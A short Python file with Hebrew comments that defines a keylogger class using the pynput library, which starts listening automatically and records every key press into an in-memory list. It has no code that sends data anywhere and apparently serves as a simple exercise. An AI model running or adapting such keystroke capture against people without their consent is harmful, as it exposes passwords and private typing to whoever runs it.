from pynput import keyboard


# מחלקה שמאזינה בזמן אמת למקלדת
class KeyLoggerService:
    # אתחול של מערכת שבאופן אוטומטי מתחילה האזנה
    def __init__(self):
        self.keylog_list = []
        self.listener = None
        self.is_listening = False
        self.start_logging()

    # התחלת האזנה
    def start_logging(self):
        self.is_listening = True
        with keyboard.Listener(
                on_press=self.log_key_event) as self.listener:
            self.listener.join()

    # הפסקת האזנה והחזרת רשימה
    def stop_logging(self):
        self.is_listening = False
        return self.keylog_list

    # הוספת אירוע לרשימה
    def log_key_event(self, key):
        if self.is_listening:
            self.keylog_list.append(key)

    # סגירת התוכנית
    def exit_program(self):
        self.listener.stop()
        exit()


a = KeyLoggerService()


